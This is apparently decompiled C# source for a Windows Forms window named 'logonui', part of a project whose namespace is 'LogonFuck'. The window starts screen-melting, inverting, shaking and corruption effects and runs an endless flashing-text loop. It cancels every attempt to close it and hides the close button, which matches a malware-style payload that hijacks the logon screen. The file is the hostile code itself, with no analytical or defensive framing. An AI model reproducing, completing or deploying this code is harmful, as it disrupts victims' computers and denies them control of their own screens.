using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using LogonFuck;

namespace logonui
{
	// Token: 0x02000002 RID: 2
	public partial class MainForm : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public MainForm()
		{
			this.InitializeComponent();
			this.meltDrawer.Start();
			this.inverseDrawer.Start();
			this.randomDrawer.Start();
			this.shakeDrawer.Start();
			this.corruptionDrawer.Start();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020FC File Offset: 0x000002FC
		private void MainForm_Load(object sender, EventArgs e)
		{
			Control.CheckForIllegalCrossThreadCalls = false;
			new Thread(new ThreadStart(this.StartRainbowText)).Start();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000211C File Offset: 0x0000031C
		protected void StartRainbowText()
		{
			double num = 0.0;
			for (;;)
			{
				int num2 = ((int)this.onetimeLabel.ForeColor.R + this.random.Next(0, 256)) / 2;
				int num3 = ((int)this.onetimeLabel.ForeColor.G + this.random.Next(0, 256)) / 2;
				int num4 = ((int)this.onetimeLabel.ForeColor.B + this.random.Next(0, 256)) / 2;
				this.onetimeLabel.ForeColor = Color.FromArgb(num2, num3, num4);
				this.onetimeLabel.BackColor = Color.FromArgb(255 - num2, 255 - num3, 255 - num4);
				this.BackColor = Color.FromArgb(255 - num2, 255 - num3, 255 - num4);
				Point location = this.onetimeLabel.Location;
				location.X += (int)(Math.Cos(num) * 10.0);
				location.Y += (int)(Math.Sin(num) * 10.0);
				this.onetimeLabel.Location = location;
				num += 0.19634954084936207;
				if (num >= 6.283185307179586)
				{
					num -= 6.283185307179586;
				}
				Thread.Sleep(25);
			}
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000004 RID: 4 RVA: 0x0000228D File Offset: 0x0000048D
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ClassStyle = 512;
				return createParams;
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000022A0 File Offset: 0x000004A0
		private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x04000001 RID: 1
		private RandomDrawer randomDrawer = new RandomDrawer(150, CopyPixelOperation.SourceInvert);

		// Token: 0x04000002 RID: 2
		private ShakeDrawer shakeDrawer = new ShakeDrawer(10, 30, true);

		// Token: 0x04000003 RID: 3
		private CorruptionDrawer corruptionDrawer = new CorruptionDrawer(0);

		// Token: 0x04000004 RID: 4
		private InverseDrawer inverseDrawer = new InverseDrawer(20, 100, CopyPixelOperation.DestinationInvert);

		// Token: 0x04000005 RID: 5
		private MeltDrawer meltDrawer = new MeltDrawer(1);

		// Token: 0x04000006 RID: 6
		private Random random = new Random();
	}
}
